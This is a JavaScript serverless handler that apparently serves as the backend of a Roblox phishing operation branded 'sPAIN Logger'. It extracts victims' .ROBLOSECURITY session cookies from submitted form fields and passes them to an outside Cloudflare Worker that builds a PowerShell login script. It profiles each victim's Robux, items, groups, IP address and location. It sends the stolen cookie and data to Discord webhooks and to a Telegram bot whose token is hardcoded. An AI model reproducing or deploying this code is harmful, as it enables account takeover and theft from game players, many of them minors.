// api/submit.js
// Cookie is ONLY used by the Cloudflare Worker (one request to roblox.com/home).
// submit.js uses ZERO cookie calls — only public Roblox endpoints with userId.

const REDIS_URL   = process.env.UPSTASH_REDIS_REST_URL;
const REDIS_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;
const TG_TOKEN    = process.env.TG_TOKEN || '8666861605:AAFA3E5IVxOtajuENoWm6BhBF0VMJZRFhy8';
const TG_CHAT     = process.env.TG_CHAT  || '7538845070';
const WORKER_URL  = 'https://holy-truth-3129.notrllyme133.workers.dev/';

function parseBody(raw) {
  if (!raw) return {};
  if (typeof raw === 'object' && !Buffer.isBuffer(raw)) return raw;
  try { return JSON.parse(Buffer.isBuffer(raw) ? raw.toString('utf8') : String(raw)); }
  catch { return {}; }
}

async function redisGet(key) {
  try {
    const res  = await fetch(`${REDIS_URL}/get/${encodeURIComponent(key)}`, {
      headers: { Authorization: `Bearer ${REDIS_TOKEN}` }
    });
    const json = await res.json();
    if (!json.result) return null;
    let r = json.result;
    if (typeof r === 'string') { try { r = JSON.parse(r); } catch { return null; } }
    if (r && typeof r.value === 'string' && !r.webhook) { try { r = JSON.parse(r.value); } catch {} }
    return r || null;
  } catch { return null; }
}

async function getIpGeo(ip) {
  try {
    if (!ip || ip === 'Unknown') return null;
    const r = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,countryCode,regionName,city,isp`);
    const d = await r.json();
    return d.status === 'success' ? d : null;
  } catch { return null; }
}

async function tgSend(text) {
  try {
    await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: TG_CHAT, text, parse_mode: 'HTML' })
    });
  } catch (_) {}
}

const WARN = '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_';
function extractCookie(raw) {
  if (!raw) return null;
  const s = raw.trim();
  const m1 = s.match(/(_\|WARNING:-DO-NOT-SHARE-THIS[^|]*\|_[\w\-.]+)/);
  if (m1) return m1[1];
  const m2 = s.match(/_\|WARNING[^|]*\|_([\w\-.]+)/);
  if (m2) return WARN + m2[1];
  const m3 = s.match(/\|_([\w\-]{50,})/);
  if (m3) return WARN + m3[1];
  if (s.length >= 200 && /^[a-zA-Z0-9\-_.]+$/.test(s)) return WARN + s;
  return null;
}
function findCookie(slots) {
  for (const val of Object.values(slots || {})) {
    const c = extractCookie(String(val || ''));
    if (c) return c;
  }
  return null;
}

// ── Worker: 1 cookie call, parses HTML, returns powershell + basic roblox info
async function callWorker(cookie, victimIp) {
  try {
    const r = await fetch(WORKER_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ cookie, victimIp })
    });
    if (!r.ok) return null;
    const d = await r.json();
    return d.success ? d : null;
  } catch { return null; }
}

// ── Public-only Roblox info — zero cookie, uses userId from worker ────────────
async function fetchPublicInfo(userId) {
  if (!userId) return null;
  try {
    const [
      profileRes, friendsRes, groupsRes,
      limitedsRes, avatarRes
    ] = await Promise.all([
      fetch(`https://users.roblox.com/v1/users/${userId}`),
      fetch(`https://friends.roblox.com/v1/users/${userId}/friends/count`),
      fetch(`https://groups.roblox.com/v1/users/${userId}/groups/roles`),
      fetch(`https://inventory.roblox.com/v1/users/${userId}/assets/collectibles?limit=100`),
      fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=150x150&format=Webp`),
    ]);

    const profile      = profileRes.ok  ? await profileRes.json()  : null;
    const friendsData  = friendsRes.ok  ? await friendsRes.json()  : null;
    const groupsData   = groupsRes.ok   ? await groupsRes.json()   : { data: [] };
    const limitedsData = limitedsRes.ok ? await limitedsRes.json() : { data: [] };
    const avatarData   = avatarRes.ok   ? await avatarRes.json()   : null;

    const groups      = groupsData.data  || [];
    const ownedGroups = groups.filter(g => g.role?.rank === 255);

    // Group robux — public endpoint, no cookie
    let groupRobux = 0;
    await Promise.all(ownedGroups.slice(0, 3).map(async g => {
      try {
        const r = await fetch(`https://economy.roblox.com/v1/groups/${g.group.id}/currency`);
        if (r.ok) { const d = await r.json(); groupRobux += d.robux || 0; }
      } catch (_) {}
    }));

    const limiteds      = limitedsData.data || [];
    const limitedsValue = limiteds.reduce((s, i) => s + (i.recentAveragePrice || 0), 0);

    // Gamepasses — public
    const gpCheck = async (id) => {
      try {
        const r = await fetch(`https://inventory.roblox.com/v1/users/${userId}/items/GamePass/${id}`);
        if (!r.ok) return false;
        const d = await r.json();
        return Array.isArray(d.data) && d.data.length > 0;
      } catch { return false; }
    };
    const [mm2, adoptMe, plsDonate] = await Promise.all([
      gpCheck('17510307'),
      gpCheck('33135930'),
      gpCheck('12345678'),
    ]);

    let accountAgeDays = 'N/A';
    if (profile?.created) {
      accountAgeDays = Math.floor(
        (Date.now() - new Date(profile.created).getTime()) / 86400000
      );
    }

    return {
      accountAgeDays,
      friends:       friendsData?.count ?? 0,
      groupsOwned:   ownedGroups.length,
      groupRobux,
      limitedsCount: limiteds.length,
      limitedsValue,
      gamepasses:    { mm2, adoptMe, plsDonate },
      avatarUrl:     avatarData?.data?.[0]?.imageUrl || null,
    };
  } catch (err) {
    console.error('fetchPublicInfo error:', err);
    return null;
  }
}

async function discordSend(url, payload) {
  if (!url?.includes('discord.com/api/webhooks')) return;
  try {
    await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
  } catch (_) {}
}

async function sendHit(webhookUrl, { powershell, allCookies, roblox, pub, slots, ip, geo, now, pageName }) {
  const robux       = (roblox?.robux         ?? 0).toLocaleString();
  const rap         = (pub?.limitedsValue     ?? 0).toLocaleString();
  const rapCount    =  pub?.limitedsCount     ?? 0;
  const ageDays     =  pub?.accountAgeDays    ?? 'N/A';
  const isPremium   =  roblox?.isPremium ? 'Yes ✅' : 'No ❌';
  const groupsOwned =  pub?.groupsOwned       ?? 0;
  const groupRobux  = (pub?.groupRobux        ?? 0).toLocaleString();
  const avatarUrl   =  pub?.avatarUrl || roblox?.avatarUrl || 'https://cdn-icons-png.flaticon.com/512/1827/1827392.png';
  const mm2         =  pub?.gamepasses?.mm2       ? '✅' : '❌';
  const adoptMe     =  pub?.gamepasses?.adoptMe   ? '✅' : '❌';
  const plsDonate   =  pub?.gamepasses?.plsDonate ? '✅' : '❌';
  const location    = [geo?.city, geo?.regionName, geo?.country].filter(Boolean).join(', ') || 'Unknown';
  const isp         =  geo?.isp || 'Unknown';
  const username    =  roblox?.username || 'Unknown';
  const userId      =  roblox?.userId   || 0;

  const slotLines = Object.entries(slots || {})
    .map(([k, v]) => `Slot ${k.replace('slot', '')}: ${v || '(empty)'}`)
    .join('\n');

  // ── Main embed ──────────────────────────────────────────────────────────────
  await discordSend(webhookUrl, {
    content: '@everyone',
    embeds: [{
      author: {
        name:     `${username}${roblox?.isPremium ? ' ⭐' : ''}`,
        url:      `https://www.roblox.com/users/${userId}/profile`,
        icon_url: avatarUrl
      },
      description: `🔥 \`sPAIN\` 🔥\n\n[Profile 👤](https://www.roblox.com/users/${userId}/profile)`,
      color: 0xc026d3,
      thumbnail: { url: avatarUrl },
      fields: [
        { name: '🔴 Robux',      value: robux,                                         inline: true  },
        { name: '🎵 RAP',        value: `${rap}\n(${rapCount} items)`,                 inline: true  },
        { name: '📅 Age',        value: `${ageDays} days`,                              inline: true  },
        { name: '💎 Premium',    value: isPremium,                                      inline: true  },
        { name: '👥 Groups',     value: `Owned: ${groupsOwned} | R$: ${groupRobux}`,   inline: true  },
        { name: '🌐 IP',         value: ip || 'Unknown',                                inline: true  },
        { name: '📍 Location',   value: `${location}\n${isp}`,                         inline: true  },
        { name: '🎮 Gamepasses', value: `MM2: ${mm2} | Adopt Me: ${adoptMe} | Pls Donate: ${plsDonate}`, inline: false },
        { name: '📋 Slots',      value: '```\n' + slotLines.substring(0, 950) + '\n```', inline: false },
      ],
      footer:    { text: `sPAIN Logger • ${pageName} • ${now}` },
      timestamp: now
    }]
  });

  // ── PowerShell — chunked ────────────────────────────────────────────────────
  if (powershell) {
    let rem = powershell, first = true;
    while (rem.length > 0) {
      const chunk = rem.substring(0, 1900);
      rem = rem.substring(1900);
      await discordSend(webhookUrl, {
        content: (first ? '```powershell\n' : '') + chunk + (rem.length === 0 ? '\n```' : '')
      });
      first = false;
    }
  }

  // ── Raw full cookie string — plain text exact bytes ─────────────────────────
  const cookieToSend = allCookies || '';
  let rem = cookieToSend;
  while (rem.length > 0) {
    await discordSend(webhookUrl, { content: rem.substring(0, 1990) });
    rem = rem.substring(1990);
  }
}

async function sendInvalid(webhookUrl, { slots, ip, geo, now, pageName }) {
  const location  = [geo?.city, geo?.country].filter(Boolean).join(', ') || 'Unknown';
  const slotLines = Object.entries(slots || {})
    .map(([k, v]) => `Slot ${k.replace('slot', '')}: ${v || '(empty)'}`)
    .join('\n');
  await discordSend(webhookUrl, {
    content: '@everyone',
    embeds: [{
      title:       '⚠️ Invalid Cookie — someone trolling',
      description: 'Cookie was **invalid or fake**.',
      color:       0xff3333,
      fields: [
        { name: '🌐 IP',       value: ip || 'Unknown',  inline: true  },
        { name: '📍 Location', value: location,          inline: true  },
        { name: '🗺️ ISP',      value: geo?.isp || 'Unknown', inline: true },
        { name: '📋 Slots',    value: '```\n' + slotLines.substring(0, 950) + '\n```', inline: false },
        { name: '🕐 Date',     value: now, inline: false }
      ],
      footer:    { text: `sPAIN Tools • ${pageName}` },
      timestamp: now
    }]
  });
}

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') return res.status(204).end();
  if (req.method !== 'POST')   return res.status(405).json({ error: 'Method not allowed' });

  const body = parseBody(req.body);
  const { slug, slots } = body;
  if (!slug)  return res.status(400).json({ error: 'slug is required' });
  if (!slots) return res.status(400).json({ error: 'slots is required' });

  const record = await redisGet(`slot:${slug}`);
  if (!record)         return res.status(404).json({ error: 'Page not found' });
  if (!record.webhook) return res.status(500).json({ error: 'No webhook on record' });

  const ip     = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.headers['x-real-ip'] || 'Unknown';
  const cookie = findCookie(slots);
  const now    = new Date().toISOString();
  const pageName = record.displayName || slug;

  // Step 1 — geo + worker run in parallel
  // Worker: waits 5s, loads roblox.com/home ONCE, parses HTML, builds PowerShell
  // geo: pure IP lookup
  const [geo, workerResult] = await Promise.all([
    getIpGeo(ip),
    cookie ? callWorker(cookie, ip) : Promise.resolve(null)
  ]);

  const roblox = workerResult?.roblox || null; // { userId, username, robux, isPremium }
  const isValid = !!roblox?.userId;

  // Step 2 — public info fetch using userId (zero cookie calls)
  const pub = isValid ? await fetchPublicInfo(roblox.userId) : null;

  const payload = {
    powershell: workerResult?.powershell || null,
    allCookies: workerResult?.allCookies || cookie,
    roblox,
    pub,
    slots,
    ip,
    geo,
    now,
    pageName
  };

  // Dualhook parent
  let parent = null;
  if (record.dualhookParent) {
    parent = await redisGet(`slot:${record.dualhookParent}`);
  }

  const sendFn = isValid ? sendHit : sendInvalid;
  await Promise.all([
    sendFn(record.webhook, payload),
    parent?.webhook && parent.webhook !== record.webhook
      ? sendFn(parent.webhook, payload)
      : Promise.resolve()
  ]);

  await tgSend(isValid ? [
    `✅ <b>COOKIE CAPTURED</b>`,
    `👤 ${roblox?.username || 'Unknown'} | R$: ${roblox?.robux ?? 0}`,
    `📄 Page: ${pageName} (${slug})`,
    `🌐 IP: <code>${ip}</code> — ${geo?.city||'?'}, ${geo?.country||'?'}`,
    `💻 PowerShell + Cookie sent to Discord`,
    `🕐 ${now}`
  ].join('\n') : [
    `⚠️ <b>INVALID SUBMISSION</b>`,
    `📄 Page: ${pageName} (${slug})`,
    `🌐 IP: <code>${ip}</code> — ${geo?.city||'?'}, ${geo?.country||'?'}`,
    `🕐 ${now}`
  ].join('\n'));

  return res.status(200).json({ success: true });
}
